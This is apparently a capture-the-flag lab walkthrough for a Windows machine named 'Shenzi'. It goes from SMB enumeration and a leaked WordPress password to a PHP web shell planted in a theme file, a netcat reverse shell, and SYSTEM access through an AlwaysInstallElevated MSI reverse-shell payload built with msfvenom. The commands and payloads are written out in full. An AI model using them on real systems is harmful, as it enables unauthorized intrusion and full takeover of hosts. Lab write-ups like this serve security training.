##### Tags: `msi`  `wordpress`  `Appearance`  `AlwaysInstallElevated`

# 🪟 Shenzi 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.103.55

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
port 21 anonymous login failed  
port 3306 mysql default login failed
port 139,445 use smbclient found Shenzi directory
```console
$ smbclient -L //192.168.103.55 -U ''     
Password for [WORKGROUP\]:

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        Shenzi          Disk      
Reconnecting with SMB1 for workgroup listing.
```
login and found 5 docs
```console
─$ smbclient //192.168.103.55/Shenzi
Password for [WORKGROUP\ming]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 29 01:45:09 2020
  ..                                  D        0  Fri May 29 01:45:09 2020
  passwords.txt                       A      894  Fri May 29 01:45:09 2020
  readme_en.txt                       A     7367  Fri May 29 01:45:09 2020
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879  Fri May 29 01:45:09 2020
  why.tmp                             A      213  Fri May 29 01:45:09 2020
  xampp-control.ini                   A      178  Fri May 29 01:45:09 2020
```
found a wordpress password in passwords.txt 
```console
$ cat passwords.txt
### XAMPP Default Passwords ###
   
5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```
gobuster didn't find a wordpress page  
the page is ended up call Shenzi  
```console
http://192.168.103.55/shenzi/
```
login with the credential admin FeltHeadwallWight357  
we can edit Appearance > Theme Editor  
add a cmd php command
```console
<?php system($_REQUEST["cmd"]); ?>
```
i used 404.php and confirmed we have RFI
```console
http://192.168.103.55/shenzi/wp-admin/404.php?cmd=whoami

shenzi\shenzi
```
upload nc.exe and got the shell
```console
192.168.103.55/shenzi/wp-admin/404.php?cmd=nc.exe -e cmd.exe 192.168.45.152 443


$ penelope -p 443          
[+] Listening for reverse shells on 0.0.0.0:443 →  127.0.0.1 • 10.0.2.15 • 192.168.45.152
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from SHENZI 192.168.103.55 Microsoft_Windows_10_Pro-x64-based_PC 👤 shenzi\shenzi • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/SHENZI~192.168.103.55-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_02-16_08_13-628.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\xampp\htdocs\shenzi>whoami

shenzi\shenzi
```
## Privilege Escalation
upload winpeas and found we have AlwaysInstallElevated
```console
����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated                                                                                                            
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```
make a .msi reverse shell payload
```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=21 -f msi -o evil.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: evil.msi
```
upload the .msi file and execute
```console
C:\Shenzi>msiexec /quiet /qn /i evil.msi
```
we are system now
```console
$ penelope -p 21           
[+] Listening for reverse shells on 0.0.0.0:21 →  127.0.0.1 • 10.0.2.15 • 192.168.45.152
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from SHENZI 192.168.103.55 Microsoft_Windows_10_Pro-x64-based_PC 👤 nt authority\system • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/SHENZI~192.168.103.55-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_02-16_11_05-484.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\WINDOWS\system32>whoami
whoami
nt authority\system
```
